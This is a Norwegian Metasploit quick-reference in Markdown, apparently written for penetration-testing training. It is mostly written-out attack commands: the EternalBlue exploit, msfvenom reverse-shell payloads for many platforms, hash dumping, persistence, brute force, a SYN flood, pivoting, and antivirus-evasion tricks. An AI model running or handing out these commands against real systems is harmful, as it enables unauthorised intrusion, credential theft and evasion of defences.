# 🔴 Metasploit Framework – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
> **Begreper og versjoner:** En exploit utnytter en sårbarhet; en payload er koden som kjøres, mens en handler tar imot forbindelsen. Kartlegging (enumeration) samler detaljer om målet. Modultall og eksempler er versjonsavhengige. Installasjonsmåten med `msfupdate.erb` brukes også i [Rapid7s offisielle installasjonsveiledning](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html); kontroller støttet miljø og fremgangsmåte for din versjon. Eksemplene er bevart. Kodere håndterer særlig problematiske tegn og garanterer ikke omgåelse av antivirus; se [Rapid7s presisering](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/). `msfdb reinit` i feilsøking må ikke behandles som en ufarlig tilkoblingskontroll: reinitialisering kan påvirke eksisterende databasedata.


```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Verdens mest brukte rammeverk for penetrasjonstesting** – en komplett veiledning til Metasploit

---

## 📋 Innholdsfortegnelse

- [Innledning](#-innledning)
- [Installasjon](#-installasjon)
- [Arkitekturoversikt](#-arkitekturoversikt)
- [Starte Metasploit](#-starte-metasploit)
- [Grunnleggende kommandoer](#-grunnleggende-kommandoer)
- [Modultyper](#-modultyper)
- [Arbeidsflyt for utnyttelse](#-arbeidsflyt-for-utnyttelse)
- [Databaseintegrasjon](#-databaseintegrasjon)
- [Skanning og kartlegging](#-skanning-og-kartlegging)
- [Generering av payloads (msfvenom)](#-generering-av-payloads-msfvenom)
- [Etter utnyttelse](#-etter-utnyttelse)
- [Hjelpemoduler](#-hjelpemoduler)
- [Praktiske eksempler](#-praktiske-eksempler)
- [Hurtigreferansetabeller](#-hurtigreferansetabeller)
- [Tips og anbefalte arbeidsmåter](#-tips-og-anbefalte-arbeidsmåter)
- [Ressurser](#-ressurser)

---

## 🎯 Innledning

**Metasploit Framework** er en plattform med åpen kildekode for penetrasjonstesting og utvikling av exploits. Den tilbyr:

- 🔍 **Informasjonsinnhenting** og sårbarhetsskanning
- 💉 **Utvikling og levering av exploits**
- 🎭 **Generering av payloads** for ulike plattformer
- 🔐 **Verktøy og teknikker etter utnyttelse**
- 📊 **Rapportering** og dokumentasjon

### Viktige komponenter

| Komponent | Beskrivelse |
|-----------|-------------|
| `msfconsole` | Hovedgrensesnitt på kommandolinjen |
| `msfvenom` | Generator og koder for payloads |
| `msfdb` | Verktøy for databaseadministrasjon |
| `msfrpcd` | RPC-bakgrunnstjeneste for fjerntilgang |

---

## 📥 Installasjon

### Kali Linux (forhåndsinstallert)
```bash
# Oppdater Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Installer avhengigheter
sudo apt install curl gnupg2 software-properties-common

# Legg til Metasploit-pakkekilden
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (anbefales ikke til produksjonsbruk)
```powershell
# Last ned installasjonsprogrammet fra: https://windows.metasploit.com/
# Kjør installasjonsprogrammet og følg instruksjonene
```

---

<a id="-arkitekturoversikt"></a>
## 🏗️ Arkitekturoversikt

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │HJELPEMOD.│  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │  KODERE  │  │   NOPS   │  │ OMGÅELSE │  │ TILLEGG  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                         GRENSESNITT                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

### Katalogstruktur
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Moduler for utnyttelse av sårbarheter
│   ├── payloads/      # Payload-moduler
│   ├── auxiliary/     # Skanning, fuzzing osv.
│   ├── post/          # Arbeid etter utnyttelse
│   ├── encoders/      # Payload-kodere
│   ├── nops/          # NOP-generatorer
│   └── evasion/       # Moduler for å omgå antivirus
├── tools/             # Ekstra verktøy
├── scripts/           # Meterpreter-skript
├── data/              # Ordlister og maler
└── plugins/           # Konsolltillegg
```

---

## 🚀 Starte Metasploit

### Initialiser databasen (første gang)
```bash
# Start PostgreSQL-tjenesten
sudo systemctl start postgresql

# Initialiser databasen
sudo msfdb init

# Kontroller databasestatus
sudo msfdb status
```

### Start msfconsole
```bash
# Vanlig oppstart
msfconsole

# Stille modus (uten banner)
msfconsole -q

# Kjør kommandoer ved oppstart
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Last inn en ressursfil
msfconsole -r commands.rc
```

---

<a id="-grunnleggende-kommandoer"></a>
## ⌨️ Grunnleggende kommandoer

### Navigasjon og hjelp

| Kommando | Beskrivelse |
|---------|-------------|
| `help` eller `?` | Vis hjelpemenyen |
| `help <command>` | Hjelp til en bestemt kommando |
| `search <term>` | Søk etter moduler på navn, CVE eller plattform |
| `use <module>` | Velg en modul |
| `back` | Gå ut av gjeldende modul |
| `info` | Vis modulinformasjon |
| `show options` | Vis modulens innstillinger |
| `show advanced` | Vis avanserte innstillinger |
| `show payloads` | List kompatible payloads |
| `show targets` | List tilgjengelige mål |

### Modulkonfigurasjon

```bash
# Angi innstillinger
set RHOSTS 192.168.1.100          # Målets IP-adresse
set RPORT 445                      # Målets port
set LHOST 192.168.1.50            # Lokal IP-adresse (angriper)
set LPORT 4444                     # Lokal port (lytter)
set PAYLOAD windows/meterpreter/reverse_tcp

# Angi globalt (gjelder på tvers av moduler)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Fjern innstillinger
unset RHOSTS
unsetg LHOST

# Kontroller gjeldende innstillinger
show options
check                              # Kontroller om målet er sårbart
```

### Kjøring

```bash
# Kjør exploiten
exploit
run

# Kjør i bakgrunnen
exploit -j

# Kjør med bestemte innstillinger
exploit -z                         # Ikke åpne økten interaktivt etter vellykket utnyttelse
```

### Øktadministrasjon

```bash
# List økter
sessions
sessions -l

# Åpne økten interaktivt
sessions -i 1

# Avslutt økten
sessions -k 1

# Avslutt alle økter
sessions -K

# Oppgrader et shell til Meterpreter
sessions -u 1

# Kjør en kommando i alle økter
sessions -c "sysinfo"
```

---

## 📦 Modultyper

### 1. Exploits
Moduler som utnytter sårbarheter.

```bash
# Søk etter exploits
search type:exploit platform:windows

# Eksempel
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Kode som kjøres etter vellykket utnyttelse.

**Typer:**
- **Singles** – selvstendige payloads
- **Stagers** – oppretter forbindelsen mellom angriper og mål
- **Stages** – lastes ned av stagers (Meterpreter)

```bash
# List payloads
show payloads

# Navnekonvensjon for payloads
<platform>/<arch>/<type>/<connection>
# Eksempel: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliary (hjelpemoduler)
Skanning, fuzzing, avlytting og mer.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Moduler for arbeid etter utnyttelse.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encoders (kodere)
Koder payloads for å unngå deteksjon.

```bash
show encoders
# Eksempel: x86/shikata_ga_nai
```

---

## 🎯 Arbeidsflyt for utnyttelse

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   KARTLEGG   │───▶│     VELG     │───▶│  KONFIGURER  │
│  REKOGNOSER  │    │    MODUL     │    │  INNSTILL.   │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    ETTER     │◀───│    UTNYTT    │◀───│  KONTROLLER  │
│  UTNYTTELSE  │    │    MÅLET     │    │    MÅLET     │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Eksempel trinn for trinn

```bash
# 1. Søk etter en exploit
msf6 > search eternalblue

# 2. Velg modul
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Vis innstillinger
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Angi mål
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Angi payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Angi lytter
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Kontroller sårbarheten (valgfritt)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Kjør
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-databaseintegrasjon"></a>
## 🗄️ Databaseintegrasjon

### Oppsett og tilkobling

```bash
# Initialiser databasen
msfdb init

# Koble til databasen
db_connect msf:password@127.0.0.1/msf

# Kontroller status
db_status

# Koble fra
db_disconnect
```

### Administrasjon av arbeidsområder

```bash
# List arbeidsområder
workspace

# Opprett arbeidsområde
workspace -a pentest_project

# Bytt arbeidsområde
workspace pentest_project

# Slett arbeidsområde
workspace -d old_project

# Gi arbeidsområdet nytt navn
workspace -r old_name new_name
```

### Administrasjon av verter

```bash
# List verter
hosts

# Legg til vert manuelt
hosts -a 192.168.1.100

# Slett vert
hosts -d 192.168.1.100

# Søk etter verter
hosts -S windows

# Eksporter verter
hosts -o /tmp/hosts.csv
```

### Administrasjon av tjenester

```bash
# List tjenester
services

# Filtrer på port
services -p 80,443

# Filtrer på tjenestenavn
services -s http

# Søk etter tjenester
services -S microsoft
```

### Administrasjon av sårbarheter

```bash
# List sårbarheter
vulns

# Legg til sårbarhet
vulns -a 192.168.1.100 -n "MS17-010"
```

### Import og eksport

```bash
# Importer Nmap-skanning
db_import /path/to/nmap_scan.xml

# Importer Nessus-skanning
db_import /path/to/nessus_scan.nessus

# Kjør Nmap direkte
db_nmap -sV -O 192.168.1.0/24

# Eksporter data
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Skanning og kartlegging

### Portskanning

```bash
# TCP SYN-skanning
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# TCP-tilkoblingsskanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Tjenestekartlegging

```bash
# SMB-kartlegging
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB-delinger
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# SSH-versjon
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP-versjon
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP-kartlegging
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Sårbarhetsskanning

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Sårbarhetsskanner for HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Generering av payloads (msfvenom)

### Grunnleggende syntaks
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Vanlige innstillinger

| Innstilling | Beskrivelse |
|--------|-------------|
| `-p` | Payload som skal brukes |
| `-f` | Utdataformat |
| `-o` | Utdatafil |
| `-e` | Koder som skal brukes |
| `-i` | Antall kodingsrunder |
| `-b` | Problematiske tegn som skal unngås |
| `-n` | Størrelse på NOP-sleden |
| `--platform` | Målplattform |
| `-a` | Arkitektur |
| `LHOST` | Lytterens IP-adresse |
| `LPORT` | Lytterens port |

### Payloads for Windows

```bash
# Omvendt TCP (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Omvendt TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Omvendt HTTPS (kryptert)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Med koding (omgåelse av antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Payloads for Linux

```bash
# Omvendt TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Omvendt TCP (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Shell som lytter (bind shell)
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Payloads for web

```bash
# Omvendt PHP-shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Omvendt ASP-shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Omvendt ASPX-shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Omvendt JSP-shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR-fil
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Skriptbaserte payloads

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (makro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Payloads for Android

```bash
# Omvendt TCP for Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Payloads for macOS

```bash
# Omvendt TCP for macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Oppsett av Multi/Handler

```bash
# Start lytteren
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Etter utnyttelse

### Grunnleggende Post-moduler

```bash
# Hent systeminformasjon
use post/windows/gather/enum_system

# Hent påloggede brukere
use post/windows/gather/enum_logged_on_users

# Hent ut passordhasher
use post/windows/gather/hashdump

# Påloggingsopplysninger fra minnet
use post/windows/gather/credentials/credential_collector

# Kontroller virtuell maskin
use post/windows/gather/checkvm
```

### Rettighetseskalering

```bash
# Forslag til eskalering i Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Omgåelse av UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Skaff SYSTEM
use post/windows/escalate/getsystem
```

### Vedvarende tilgang

```bash
# Vedvarende tilgang via registeret
use exploit/windows/local/persistence_service
set SESSION 1
run

# Vedvarende tilgang via planlagt oppgave
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Hjelpemoduler

### Brute force (systematisk utprøving)

```bash
# Brute force mot SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Brute force mot SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Brute force mot FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Trafikkavlytting

```bash
# Avlytting av HTTP-passord
use auxiliary/sniffer/psnuffle
run

# Ta opp pakker
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### Tjenestenekt (bare testing)

```bash
# SYN-flom
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Praktiske eksempler

### Eksempel 1: EternalBlue-angrep (MS17-010)

```bash
# Start Metasploit
msfconsole -q

# Søk etter en exploit
search eternalblue

# Bruk exploiten
use exploit/windows/smb/ms17_010_eternalblue

# Konfigurer
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Kontroller om målet er sårbart
check

# Utnytt
exploit
```

### Eksempel 2: Angrep mot en webapplikasjon

```bash
# Skann etter sårbarheter
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Utnytt filopplasting
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Eksempel 3: Multi-Handler med msfvenom

```bash
# Terminal 1: Generer payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: Start mottakeren (handler)
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Overfør payload.exe til målet og kjør den
# Økten kobler seg til handleren
```

### Eksempel 4: Pivotering gjennom en kompromittert vert

```bash
# Etter at en Meterpreter-økt er opprettet
meterpreter > run autoroute -s 10.10.10.0/24

# Eller fra msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Skann nå det interne nettverket
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Hurtigreferansetabeller

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `search <term>` | Søk etter moduler |
| `use <module>` | Velg modul |
| `show options` | Vis innstillinger |
| `set <opt> <val>` | Angi innstillingsverdi |
| `exploit` / `run` | Kjør modul |
| `back` | Tilbake til hovednivået |
| `sessions -l` | List økter |
| `sessions -i <id>` | Åpne økten interaktivt |

### Vanlige payloads

| Payload | Beskrivelse |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter (32-bit) |
| `windows/x64/meterpreter/reverse_tcp` | Windows Meterpreter (64-bit) |
| `windows/meterpreter/reverse_https` | Kryptert forbindelse |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java/JSP-shell |
| `android/meterpreter/reverse_tcp` | Android Meterpreter |

### Utdataformater (msfvenom)

| Format | Filendelse | Bruksområde |
|--------|-----------|----------|
| `exe` | .exe | Kjørbar Windows-fil |
| `elf` | (none) | Kjørbar Linux-fil |
| `macho` | (none) | Kjørbar macOS-fil |
| `raw` | varies | Rå shellcode |
| `asp` | .asp | IIS-webserver |
| `aspx` | .aspx | .NET-webserver |
| `php` | .php | PHP-webserver |
| `jsp` | .jsp | Java-webserver |
| `war` | .war | Utrulling på Tomcat |
| `psh` | .ps1 | PowerShell-skript |
| `vba` | .vba | Office-makro |
| `dll` | .dll | Windows-bibliotek |

### Vanlige kodere

| Koder | Beskrivelse |
|---------|-------------|
| `x86/shikata_ga_nai` | Polymorf XOR-koder |
| `x64/xor` | XOR-koder (64-bit) |
| `x86/alpha_mixed` | Alfanumerisk koder |
| `php/base64` | Base64-koder for PHP |

---

## 💡 Tips og anbefalte arbeidsmåter

### ⚠️ Juridisk merknad
> **VIKTIG:** Bruk Metasploit bare mot systemer du eier eller har uttrykkelig skriftlig tillatelse til å teste. Uautorisert tilgang til datasystemer er ulovlig.

### Ytelsestips

1. **Bruk databasen**
   ```bash
   # Initialiser og bruk alltid databasen
   msfdb init
   db_status
   ```

2. **Bruk arbeidsområder**
   ```bash
   workspace -a client_pentest
   ```

3. **Ressursskript**
   ```bash
   # Lagre kommandoene i en .rc-fil
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Kjør skriptet
   msfconsole -r handler.rc
   ```

4. **Bruk tråder med omtanke**
   ```bash
   set THREADS 10  # Ikke overbelast målet
   ```

### Teknikker for å unngå deteksjon

1. **Flere kodingsrunder**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Egne maler**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Bruk HTTPS-payloads**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Feilsøking

| Problem | Løsning |
|-------|----------|
| Databasen kobler ikke til | `msfdb reinit` |
| Modulen lastes ikke | `reload_all` |
| Økten avsluttes straks | Kontroller antivirus og bruk en kodet payload |
| Exploiten feiler | Kontroller målets OS-versjon og prøv et annet mål |

---

## 📚 Ressurser

### Offisiell dokumentasjon
- [Metasploit-dokumentasjon](https://docs.metasploit.com/)
- [Rapid7-blogg](https://www.rapid7.com/blog/)
- [Metasploit på GitHub](https://github.com/rapid7/metasploit-framework)

### Læringsressurser
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Hurtigreferanser
- [SANS-hurtigreferanse for Metasploit](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter-hurtigreferanse](Meterpreter.nb.md)

---

## 📄 Lisens

Denne hurtigreferansen er kun til undervisningsformål. Bruk den ansvarlig og etisk.

---

<p align="center">
  <b>God hacking! 🔴</b><br>
  <i>Husk: Med stor makt følger stort ansvar</i>
</p>
